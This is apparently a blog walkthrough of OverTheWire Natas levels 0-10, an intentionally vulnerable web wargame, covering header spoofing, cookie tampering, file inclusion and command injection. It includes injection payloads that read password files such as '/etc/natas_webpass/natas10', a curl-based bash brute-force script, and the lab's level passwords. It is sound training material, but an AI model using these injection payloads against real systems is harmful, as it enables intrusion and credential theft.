---
title: OverTheWire&#58; Natas 0-10
category: Application Security
tags: ["Cookies", "Injection"]
date: 2019-02-19
---

Preparing for OSCP, I've been working through [OverTheWire - natas](http://overthewire.org/wargames/natas/) and here is my walktrough for levels 0-10. Natas is a series of insecure webapps, which aim to teach the basics of web security.

The security topics covered in these levels include:
* Editing HTTP headers
* Editing cookies
* File inclusion vulnerabilities
* Bruteforce techniques
* Command injections

## Natas 0

It says that we can find the password for the next level on the page, yet we don't see it, do we ? Right click anywhere on the page and view the page, you should notice a comment as below: 

```
...
<!--The password for natas1 is gtVrDuiDfck831PqWsLEZy5gyDz1clto -->
...
```

## Natas 1

Same message but this time right clik was disabled we can bypass it using different methods:
* Disable Javascript on the page.
* Use a proxy such as Burp Suite.
* CTRL + U view page shortcut. 
* Use Curl.
* ...

```
...
<!--The password for natas2 is ZluruAthQk7Q2MqmDeTiUij2ZvWy2mBi -->
...
```

## Natas 2

It says there's nothing on this page, when we view the code source we see:
```
...
<h1>natas2</h1>
<div id="content">
There is nothing on this page
<img src="files/pixel.png">
</div>
...
```

There is an image *pixel.png* inside files directory, if we look at that directory we notice a file called users.txt:

```
# username:password
alice:BYNdCesZqW
bob:jw2ueICLvT
charlie:G5vCxkVV3m
natas3:sJIJNW6ucpu6HPZ1ZAchaDtwd7oGrD14
eve:zo4mJWyNj2
mallory:9urtcpzBmH
```

## Natas 3

Same message, we view source code we notice this comment:

```
<!-- No more information leaks!! Not even Google will find it this time... -->
```

Hmm, smells like we need to use Google Dork: 

```
site:natas3.natas.labs.overthewire.org
```

![natas3](/images/overthewire_natas/natas3.png)

Inside s3cr3t directory there's a users.txt file containing the password for the next level:

```
natas4:Z9tkRkWmpt9Qr7XrR5jWRkgOU901swEZ
```

## Natas 4

It says Access disallowed. You are visiting from "" while authorized users should come only from "http://natas5.natas.labs.overthewire.org/". We can bypass this by sending `Referer HTTP HEADER` containing: `http://natas5.natas.labs.overthewire.org/`:

```
 curl http://natas4.natas.labs.overthewire.org/ -H "Referer: http://natas5.natas.labs.overthewire.org/" -H "Authorization: Basic bmF0YXM0Olo5dGtSa1dtcHQ5UXI3WHJSNWpXUmtnT1U5MDFzd0Va"
```

![natas4](/images/overthewire_natas/natas4.png)

Password: `iX6IOfmpN7AYOQGPwtn3fXpbaJVJcHfq`

## Natas 5

Access disallowed. You are not logged in. It seems we're dealing with sessions, let's take a look at cookies:

![natas5](/images/overthewire_natas/natas5_0.png)

As you can notice, we have a cookie called `loggedin` set to `0`, by setting it to `1` we should get logged in.

![natas5](/images/overthewire_natas/natas5_1.png)

Password for natas 6: `aGoY4q2Dc6MgDq4oL4YtoKtyAg9PeHa1`

## Natas 6

This time we are facing a password form and we have access the source code by clicking on View source code link:

```
...
<?

include "includes/secret.inc";

    if(array_key_exists("submit", $_POST)) {
        if($secret == $_POST['secret']) {
        print "Access granted. The password for natas7 is <censored>";
    } else {
        print "Wrong secret";
    }
    }
?>

<form method=post>
Input secret: <input name=secret><br>
<input type=submit name=submit>
</form>
...
```

As you can see there is `secret.inc` file inside includes directory:

```
<?
$secret = "FOEIUWGHFEEUHOFUOIU";
?>
```

By inserting above password we get the next level password: `7z3hEENjQtflzgnT29q7wAvMNfZdh0i9`

## Natas 7

We have two links home and about, we view the source code of the page:
```
...
<body>
<h1>natas7</h1>
<div id="content">

<a href="index.php?page=home">Home</a>
<a href="index.php?page=about">About</a>
<br>
<br>

<!-- hint: password for webuser natas8 is in /etc/natas_webpass/natas8 -->
</div>
</body>
...
```
We got a hint, the password should be inside `/etc/natas_webpass/natas8` but how can we read this file ? if we look closely at the source code of the page we can notice this snippet: `index.php?page=home` it seems like *local file inclusion* vulnerability:

![natas7](/images/overthewire_natas/natas7.png)

Password for the next leve: `DBfUBfqQG69KvJvJ1iAbMoIpwSNQ9bWe`

## Natas 8

I like this one, we have a form and we got access to it source code:

```
...
<?

$encodedSecret = "3d3d516343746d4d6d6c315669563362";

function encodeSecret($secret) {
    return bin2hex(strrev(base64_encode($secret)));
}

if(array_key_exists("submit", $_POST)) {
    if(encodeSecret($_POST['secret']) == $encodedSecret) {
    print "Access granted. The password for natas9 is <censored>";
    } else {
    print "Wrong secret";
    }
}
?>
...
```

We need to match `encodedSecret` variable and to do so we first need to revert the process of `encodeSecret`.

Here is what `encodeSecret` function does:
```
take user input (string) -> base64 encode input -> revert base64 encoded string -> Returns an ASCII string containing the hexadecimal representation of string 
``` 

This is what we need to do:
```
take encodedSecret as input -> hex2bin -> revert string -> base64 decode string 
```

POC:

![natas8](/images/overthewire_natas/natas8_0.png)

Form's password: `oubWYf2kBq`

![natas8](/images/overthewire_natas/natas8_1.png)

Next level password: `W0mMhUcRRnG8dcghE4qvk3JA9lGt8nDl`

## Natas 9

This time we have a search and we have access to the source code:
```
...
<?
$key = "";

if(array_key_exists("needle", $_REQUEST)) {
    $key = $_REQUEST["needle"];
}

if($key != "") {
    passthru("grep -i $key dictionary.txt");
}
?>
...
```
We have a classic command injection here, we control `$_REQUEST["needle"]` and the developer didn't sanitize the user input before using it on `passthru` function which basicly execute an external program and display raw output. [passthru()](http://php.net/manual/en/function.passthru.php) is similar to [exec()](http://php.net/manual/en/function.exec.php) or [system()](http://php.net/manual/en/function.system.php).

As web know from earlier, passwords are stored in `/etc/natas_webpass/natasX` where `X` is the level number. By inserting `;cat /etc/natas_webpass/natas10` we break out from `grep -i` command and print out the natas10 password.

![natas9](/images/overthewire_natas/natas9_1.png)

Next level password: `nOpp1igQAkUzaI1GUUjzn1bFVj7xCNzu`

## Natas 10

Similar to the previous level but this time the developer filtered some characters using regex:
```
...
if(preg_match('/[;|&]/',$key)) {
        print "Input contains an illegal character!";
    } else {
        passthru("grep -i $key dictionary.txt");
    }
...
```
Unfortunately the last approach won't work here, we need to see this from a different angle, `$key`'s value is reflected as a parameter to grep command, if we take a look at the man of grep:

![natas10](/images/overthewire_natas/natas10_00.png)

In PHP code the grep command is invoked in this form:

```
grep [OPTIONS] PATTERN [FILE]
```

We already know that we control the `key` variable, we can use it to pass `PATTERN` and `FILE` parameter to `grep`. By brute forcing PATTERN parameter (looking for existent character in the password) and passing `/etc/natas_webpass/natas11` as FILE parameter we can obtain natas11's password.   

![natas10](/images/overthewire_natas/natas10.png)

We can do much better, let's append our injection with `%23` which is the url encoded value of `#`. In bash `#` is used for comments, so by inserting `#` at the end of the command we ignore `dictionary.txt` Hence, we got a clean output which make it easy for us to create a script to brute force.

```
#!/bin§bash

AUTH="Authorization: Basic bmF0YXMxMDpuT3BwMWlnUUFrVXphSTFHVVVqem4xYkZWajd4Q056dQ=="

for fuzz in {a..z}
do
	content=`curl -s "http://natas10.natas.labs.overthewire.org/?needle=$fuzz%20/etc/natas_webpass/natas11%20%23&submit=Search" -H "$AUTH"`
	password=$(echo "$content" | grep -A1 '<pre>' | tr -d '\n,<pre>,</pre>' )
	if [ ! -z $password ] && [[ "$password" =~ [a-zA-Z0-9]+ ]]
	then
		echo password found: $password
		exit 0
	fi
done
```

Output:

![natas10](/images/overthewire_natas/natas10_02.png)

Manuel:

![natas10](/images/overthewire_natas/natas10_01.png)

The password: `U82q5TCMMQ9xuFoI3dYX61s7OZD9JKoK`


Thanks for reading, Happy hacking.
